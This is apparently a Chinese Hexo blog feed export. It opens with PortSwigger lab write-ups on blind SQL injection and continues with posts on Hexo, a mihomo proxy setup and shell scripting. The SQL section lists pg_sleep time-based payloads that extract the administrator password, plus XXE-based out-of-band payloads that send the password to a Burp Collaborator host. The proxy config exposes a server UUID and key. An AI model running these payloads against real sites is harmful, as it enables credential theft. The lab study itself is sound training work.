<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>延迟<span class="number">10</span>秒</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></span><br><span class="line"><span class="string">2.不延时</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="comment">--</span></span><br><span class="line"><span class="number">3.</span>延时，说明有administrator用户</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br><span class="line"><span class="string">4.延时，说明密码长度为20</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span><span class="operator">+</span><span class="keyword">AND</span><span class="operator">+</span>LENGTH(password)<span class="operator">=</span><span class="number">20</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--</span></span><br><span class="line"><span class="number">5.</span>bp爆破</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;+AND+SUBSTRING(password,§b§,1)=&#x27;</span>§a§<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br></pre></td></tr></table></figure>
<h2 id="Blind-SQL-injection-with-out-of-band-interaction">Blind SQL injection with out-of-band interaction</h2>
<p><img src="/posts/3b7c6011//image-20250320124609391.png" alt="image-20250320124609391"></p>
<p><a href="http://k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com">k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: TrackingId<span class="operator">=</span>Mf3GZbtHdrUPYCyR<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--; session=7HQmzle2kv8m9yAyiZADwZ8B64e6hGQp</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250320124746996.png" alt="image-20250320124746996"></p>
<h2 id="Blind-SQL-injection-with-out-of-band-data-exfiltration">Blind SQL injection with out-of-band data exfiltration</h2>
<p>跟上边类似的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250320142450030.png" alt="image-20250320142450030"></p>
<h2 id="SQL-injection-with-filter-bypass-via-XML-encoding">SQL injection with filter bypass via XML encoding</h2>
<p>XML绕过注入</p>
<p><img src="/posts/3b7c6011//image-20250320153828228.png" alt="image-20250320153828228"></p>
<p><img src="/posts/3b7c6011//image-20250320153954704.png" alt="image-20250320153954704"></p>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>靶场练习</category>
      </categories>
      <tags>
        <tag>PortSwigger靶场</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>【Hexo】使用中的总结</title>
    <url>/posts/8071f3a9/</url>
    <content><![CDATA[<h2 id="带空格的标题">带空格的标题</h2>
<p>带空格的标题需要用双引号<code>“标  题”</code>引起来，不然文件和标题的命名会发生错误。</p>
<p><img src="/posts/8071f3a9//image-20250305142442398.png" alt="image-20250305142442398"></p>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>博客写作</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】mihomo代理</title>
    <url>/posts/f4ca21fa/</url>
    <content><![CDATA[<h2 id="mihomo">mihomo</h2>
<p>阿里云服务器每次访问外网都超时，之前安装工具都是先下载到本地再上传到服务器。前些天复现漏洞下个镜像拖来拖去的，实在是忍无可忍了。网上看了各种文章，尝试了各种方法，最后使用了mihomo代理成功访问外网。</p>
<h3 id="mihomo安装">mihomo安装</h3>
<ol>
<li class="lvl-3">
<p>mihomo下载，github地址：<a href="https://github.com/MetaCubeX/mihomo">https://github.com/MetaCubeX/mihomo</a></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 因为没法访问外网，要先下载到本地，再传到服务器。</span><br><span class="line">2. gzip -d mihomo.gz          <span class="comment">#解压缩</span></span><br><span class="line">3. <span class="built_in">mv</span> mihomo /usr/local/bin/mihomo   <span class="comment">#将 mihomo 移动到 /usr/local/bin/ 目录：</span></span><br><span class="line">4. <span class="built_in">sudo</span> <span class="built_in">chmod</span> +x /usr/local/bin/mihomo  <span class="comment">#设置可执行权限</span></span><br></pre></td></tr></table></figure>
<p>经过上述步骤以后，要在为mihomo添加配置文件config.yaml和Country.mmdb。Country.mmdb我是在在github上找的。</p>
<p>2.创建 systemd 配置文件 <code>/etc/systemd/system/mihomo.service</code>，并添加如下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=mihomo Daemon, Another Clash Kernel.</span><br><span class="line">After=network.target NetworkManager.service systemd-networkd.service iwd.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">LimitNPROC=500</span><br><span class="line">LimitNOFILE=1000000</span><br><span class="line">CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_DAC_OVERRIDE</span><br><span class="line">AmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_DAC_OVERRIDE</span><br><span class="line">Restart=always</span><br><span class="line">ExecStartPre=/usr/bin/sleep 1s</span><br><span class="line">ExecStart=/usr/local/bin/mihomo -d /etc/mihomo</span><br><span class="line">ExecReload=/bin/kill -HUP <span class="variable">$MAINPID</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>创建配置文件。mihomo和clash meta用的是相同的内核，因此这个配置文件和我本地Windows系统用的clash meta是一样的。我创建的配置文件在/etc/mihomo/config.yaml。部分细节如下：</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[11:42:20 root@rocky95 ~]# <span class="built_in">head</span> -n 20 /etc/mihomo/config.yaml </span><br><span class="line">mixed-port: 7890</span><br><span class="line">allow-lan: <span class="literal">true</span></span><br><span class="line">bind-address: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">mode: rule</span><br><span class="line">log-level: info</span><br><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:9090&#x27;</span></span><br><span class="line">unified-delay: <span class="literal">true</span></span><br><span class="line">tcp-concurrent: <span class="literal">true</span></span><br><span class="line">dns:</span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">    ipv6: <span class="literal">false</span></span><br><span class="line">    default-nameserver: [223.5.5.5, 119.29.29.29]</span><br><span class="line">    enhanced-mode: fake-ip</span><br><span class="line">    fake-ip-range: 198.18.0.1/16</span><br><span class="line">    use-hosts: <span class="literal">true</span></span><br><span class="line">    nameserver: [<span class="string">&#x27;https://doh.pub/dns-query&#x27;</span>, <span class="string">&#x27;https://dns.alidns.com/dns-query&#x27;</span>]</span><br><span class="line">    fallback: [<span class="string">&#x27;https://doh.dns.sb/dns-query&#x27;</span>, <span class="string">&#x27;https://dns.cloudflare.com/dns-query&#x27;</span>, <span class="string">&#x27;https://dns.twnic.tw/dns-query&#x27;</span>, <span class="string">&#x27;tls://8.8.4.4:853&#x27;</span>]</span><br><span class="line">    fallback-filter: &#123; geoip: <span class="literal">true</span>, ipcidr: [240.0.0.0/4, 0.0.0.0/32] &#125;</span><br><span class="line">proxies:</span><br><span class="line">    - &#123; name: <span class="string">&#x27;剩余流量：918.16 GB&#x27;</span>, <span class="built_in">type</span>: vless, server: pq.aws48.yydjc.top, port: 443, uuid: 6806220d-2952-4fab-8617-ea56feab45b1, udp: <span class="literal">true</span>, tls: <span class="literal">true</span>, skip-cert-verify: <span class="literal">false</span>, flow: xtls-rprx-vision, client-fingerprint: chrome, servername: buylite.tv.apple.com, reality-opts: &#123; public-key: 6T-kYBf65ERaEAhxIyHL1FCfu0QR6P2XQMtcvUgzSjM, short-id: 70ad150d &#125; &#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>重启systemd</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>启用 mihomo 服务：</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> mihomo</span><br></pre></td></tr></table></figure>
<h3 id="mihomo使用">mihomo使用</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 启用 mihomo 服务：</span><br><span class="line">systemctl <span class="built_in">enable</span> mihomo</span><br><span class="line">2. 立即启动 mihomo:</span><br><span class="line">systemctl start mihomo</span><br><span class="line">3. 重新加载mihomo</span><br><span class="line">systemctl reload mihomo</span><br><span class="line">4. 检查 mihomo 的运行状况</span><br><span class="line">systemctl status mihomo</span><br><span class="line">5. 检查 mihomo 的运行日志</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -e</span><br><span class="line">或</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -f</span><br><span class="line">6. 关闭 mihomo 服务：</span><br><span class="line">systemctl <span class="built_in">disable</span> mihomo</span><br></pre></td></tr></table></figure>
<h2 id="为Linux设置代理">为Linux设置代理</h2>
<h3 id="临时启用和关闭代理">临时启用和关闭代理</h3>
<p>在使用Linux时，临时启用代理的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://ip:port</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://ip:port</span><br></pre></td></tr></table></figure>
<p>ip和port为你的代理服务器的ip以及开放的端口。</p>
<p>取消代理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unset</span> http_proxy</span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br></pre></td></tr></table></figure>
<h3 id="永久全局代理">永久全局代理</h3>
<p>永久全局代理将临时启用代理的命令添加至系统配置文件中，source刷新shell环境即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">……</span><br><span class="line"><span class="built_in">export</span> http_proxy=http://ip:port</span><br><span class="line"><span class="built_in">export</span> https_proxy=https://ip:port</span><br><span class="line">……</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
<h3 id="设置代理的基本语法">设置代理的基本语法</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`环境变量</span><br><span class="line">http_proxy:为http变量设置代理;默认不填开头以http协议传输</span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">`以下是常见的基本语法</span><br><span class="line">http_proxy=ip:port</span><br><span class="line">http_proxy=http://ip:port</span><br><span class="line">http_proxy=socks4://ip:port</span><br><span class="line">http_proxy=socks5://ip:port</span><br><span class="line">​</span><br><span class="line">`如果不想设置白名单,也可以使用用户名和密码进行验证</span><br><span class="line">http_proxy=http://username:password@ip:port</span><br><span class="line">http_proxy=http://username:password@ip:port</span><br><span class="line">​</span><br><span class="line">https_proxy:为https设置代理</span><br><span class="line">ftp_proxy:为ftp设置代理</span><br><span class="line">all_proxy:全部变量设置代理,设置了这个的时候上面不需要设置</span><br><span class="line">no_proxy:无需代理的主机或域名;可以使用通配符,多个时使用<span class="string">&quot;,&quot;</span>号分隔</span><br><span class="line"><span class="comment"># 示例：</span></span><br><span class="line">*.aiezu.com,10.*.*.*,192.168.*.*</span><br><span class="line">*.<span class="built_in">local</span>,localhost,127.0.0.1</span><br></pre></td></tr></table></figure>
<h3 id="部署Web控制面板">部署Web控制面板</h3>
<p>部署好了mihomo代理以后，在虚拟机上切换节点、重载配置等较为不便，可以为mihomo部署控制面板，方便管理。但如果服务器暴露在公网中，使用Web面板会很不安全。因此我只在需要调试的时候会把Web面板打开。部署控制面板的操作如下：</p>
<ol>
<li class="lvl-3">
<p>在config.yaml中添加或修改如下配置：</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">external-controller: <span class="string">&#x27;0.0.0.0:7891&#x27;</span></span><br><span class="line">external-ui: /etc/mihomo/ui</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>从github下载</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/metacubex/metacubexd.git -b gh-pages /etc/mihomo/ui</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>重启mihomo服务</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart mihomo</span><br></pre></td></tr></table></figure>
<p>本地访问<a href="http://ip">http://ip</a>:port/ui就可以访问Web面板了</p>
<p><font class="notice">注意：虽然查看该面板需要密码，但是密码随机输入即可，并不具备安全性</font></p>
<h2 id="docker使用网络代理">docker使用网络代理</h2>
<p>gitbook上有一篇docker的详解：<a href="https://yeasy.gitbook.io/docker_practice/">Docker — 从入门到实践</a></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>为 dockerd 创建配置文件夹。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>为 dockerd 创建 HTTP/HTTPS 网络代理的配置文件，文件路径是 /etc/systemd/system/docker.service.d/http-proxy.conf 。并在该文件中添加相关环境变量。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">&quot;HTTP_PROXY=http://proxy.example.com:8080/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;HTTPS_PROXY=http://proxy.example.com:8080/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;NO_PROXY=localhost,127.0.0.1,.example.com&quot;</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>刷新配置并重启 docker 服务。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="客户端使用代理">客户端使用代理</h2>
<p>因为代理是部署在服务器的，因此自己的手机、电脑、平板等也可以使用服务器的代理。但是要修改配置文件allow-lan改为true。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">allow-lan: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="遇到的问题：">遇到的问题：</h2>
<ol>
<li class="lvl-3">
<p>网上说mihomo的配置文件和clash是一样的，因此要把订阅链接转换成clash的订阅链接，可是我转换后并不能成功使用。经过进一步的了解得知mihomo是clash meta的更新，随后转成meta链接成功（在订阅链接后加<code>&amp;flag=meta</code>）。</p>
</li>
<li class="lvl-3">
<p>为docker更换源、使用阿里加速器。然而尝试了各种源均没有什么卵用，只有个别镜像拉取成功，并且就算docker配置成功了，我还是没办法直接下载github的资源。</p>
</li>
<li class="lvl-3">
<p>使用clash代理，然而我花好久终于要整好的时候，clash并不支持我的配置文件中<code>type: hysteria2</code>，也就是不支持hysteria2协议。一时间手足无措，最后在一篇文章里看到mihomo支持，最后配置成功。</p>
</li>
</ol>
<p>本文参考：</p>
<p><a href="https://yeasy.gitbook.io/docker_practice/">Docker — 从入门到实践</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】shell编程</title>
    <url>/posts/63063238/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="shell编程">shell编程</h2>
<p>这里说的Shell 脚本（shell script），是在Linux 环境下运行的脚本程序</p>
<p>Shell 编程跟 JavaScript、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。</p>
<p>Linux 的 Shell 种类众多，常见的有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Bourne Shell（/usr/bin/sh或/bin/sh）</p>
</li>
<li class="lvl-2">
<p>Bourne Again Shell（/bin/bash）</p>
</li>
<li class="lvl-2">
<p>C Shell（/usr/bin/csh）</p>
</li>
<li class="lvl-2">
<p>K Shell（/usr/bin/ksh）</p>
</li>
<li class="lvl-2">
<p>Shell for Root（/sbin/sh）</p>
</li>
<li class="lvl-2">
<p>……</p>
</li>
</ul>
<p>Bash是大多数Linux 系统默认的 Shell，本文也仅关注Bash Shell。</p>
<p>在一般情况下，并不区分 Bourne Shell 和 Bourne Again Shell，所以，像 <strong>#!/bin/sh</strong>，它同样也可以改为 <strong>#!/bin/bash</strong>。</p>
<p><strong>#!</strong> 告诉系统其后路径所指定的程序即是解释此脚本文件的 Shell 程序。</p>
<h3 id="入门">入门</h3>
<h4 id="运行Shell脚本">运行Shell脚本</h4>
<p>编写shell脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi test.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello World !&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>#!</strong> 是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。</p>
<p>echo 命令用于向窗口输出文本。</p>
<p>运行 Shell 脚本有两种方法：</p>
<p><strong>1、作为可执行程序</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ./test.sh  <span class="comment">#使脚本具有执行权限</span></span><br><span class="line">./test.sh  <span class="comment">#执行脚本</span></span><br></pre></td></tr></table></figure>
<p>默认情况下，一定要写成 <strong>./test.sh</strong>，而不是 <strong><a href="http://test.sh">test.sh</a></strong>，运行其它二进制的程序也一样。</p>
<p>除非将当前目录.加入到PATH环境变量中，配置方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vi /etc/profile</span><br><span class="line">加入一行</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:.</span><br><span class="line">保存之后，执行</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
<p><strong>2、作为解释器参数</strong></p>
<p>直接运行解释器，其参数就是 shell 脚本的文件名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh test.sh</span><br></pre></td></tr></table></figure>
<p>这种方式运行的脚本，不需要在第一行指定解释器信息，写了也没用。</p>
<h4 id="编写一个快捷创建shell脚本的命令">编写一个快捷创建shell脚本的命令</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -z <span class="variable">$1</span>;<span class="keyword">then</span></span><br><span class="line">  newfile=<span class="string">&quot;./script_`date +%m%d_%s`&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  newfile=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newfile</span></span><br><span class="line"><span class="keyword">if</span>  ! grep <span class="string">&quot;^#!&quot;</span> <span class="variable">$newfile</span> &amp;&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; <span class="variable">$newfile</span> &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string"># Author:</span></span><br><span class="line"><span class="string"># Date &amp; Time: `date +&quot;%F %T&quot;`</span></span><br><span class="line"><span class="string">#Description:</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">vim +5 <span class="variable">$newfile</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="variable">$newfile</span></span><br></pre></td></tr></table></figure>
<p>将以上内容编写好之后保存为shell文件，然后执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x shell</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> shell /usr/bin/</span><br></pre></td></tr></table></figure>
<h4 id="echo命令">echo命令</h4>
<p>Shell 的 echo 指令与 PHP 的 echo 指令类似，都是用于字符串的输出。命令格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> string</span><br></pre></td></tr></table></figure>
<p>显示普通字符串:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span></span><br></pre></td></tr></table></figure>
<p>这里的双引号完全可以省略，以下命令与上面实例效果一致：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> It is a <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>显示转义字符:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\&quot;It is a test\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>结果将是:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;It is a test&quot;</span></span><br></pre></td></tr></table></figure>
<p>同样，双引号也可以省略</p>
<p>read 命令从标准输入中读取一行,并把输入行的每个字段的值指定给 shell 变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">read</span> name </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$name</span> It is a test&quot;</span></span><br></pre></td></tr></table></figure>
<p>以上代码保存为 <a href="http://test.sh">test.sh</a>，name 接收标准输入的变量，结果将是:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@www ~]# sh test.sh</span><br><span class="line">OK                     <span class="comment">#标准输入</span></span><br><span class="line">OK It is a <span class="built_in">test</span>        <span class="comment">#输出</span></span><br></pre></td></tr></table></figure>
<h5 id="显示换行">显示换行</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;OK! \n&quot;</span> <span class="comment"># -e 开启转义</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OK!</span><br><span class="line">It is a <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h5 id="显示不换行">显示不换行</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;OK! \c&quot;</span> <span class="comment"># -e 开启转义 \c 不换行</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OK! It is a <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h4 id="printf-命令">printf 命令</h4>
<p>printf 命令的语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>  format-string  [arguments...]</span><br></pre></td></tr></table></figure>
<p><strong>参数说明：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>format-string:</strong> 为格式控制字符串</p>
</li>
<li class="lvl-2">
<p><strong>arguments:</strong> 为参数列表。</p>
</li>
</ul>
<p>实例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4s\n&quot;</span> 姓名 性别 体重kg  </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭靖 男 66.1234 </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 杨过 男 48.6543 </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭芙 女 47.9876 </span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">姓名     性别   体重kg</span><br><span class="line">郭靖     男      66.12</span><br><span class="line">杨过     男      48.65</span><br><span class="line">郭芙     女      47.99</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>%s %c %d %f都是格式替代符</p>
</li>
<li class="lvl-2">
<p>%-10s 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐），任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。</p>
</li>
<li class="lvl-2">
<p>%-4.2f 指格式化为小数，其中.2指保留2位小数。</p>
</li>
</ul>
<p>printf的转义序列：</p>
<table>
<thead>
<tr>
<th>序列</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>\a</td>
<td>警告字符，通常为ASCII的BEL字符</td>
</tr>
<tr>
<td>\b</td>
<td>后退</td>
</tr>
<tr>
<td>\c</td>
<td>抑制（不显示）输出结果中任何结尾的换行字符（只在%b格式指示符控制下的参数字符串中有效），而且，任何留在参数里的字符、任何接下来的参数以及任何留在格式字符串中的字符，都被忽略</td>
</tr>
<tr>
<td>\f</td>
<td>换页（formfeed）</td>
</tr>
<tr>
<td>\n</td>
<td>换行</td>
</tr>
<tr>
<td>\r</td>
<td>回车（Carriage return）</td>
</tr>
<tr>
<td>\t</td>
<td>水平制表符</td>
</tr>
<tr>
<td>\v</td>
<td>垂直制表符</td>
</tr>
<tr>
<td>\</td>
<td>一个字面上的反斜杠字符</td>
</tr>
<tr>
